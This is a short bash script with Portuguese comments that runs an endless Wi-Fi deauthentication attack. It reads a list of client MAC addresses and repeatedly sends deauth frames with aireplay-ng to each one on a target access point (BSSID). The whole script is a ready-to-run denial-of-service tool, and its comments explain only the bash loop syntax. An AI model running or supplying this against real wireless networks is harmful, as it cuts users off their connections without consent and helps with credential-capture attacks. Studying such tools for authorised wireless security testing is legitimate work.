#!/bin/bash

bssid=$1
list_macs=$2

# while true; do cria um loop infinito
# while cria um loop condicional. read lé e guarda o valor em mac que vai ser usado no aireplay-ng
# -r instrui o read a não interpretar caracteres de barra invertida (\) como caracteres especiais.
# do o loop continuará até que não haja mais entradas para ler ou até que o script seja interrompido.

while true; do
  while read -r mac; do
    aireplay-ng -0 1 -a $bssid -c $mac wlo1mon
    sleep 2
  done < $list_macs
done
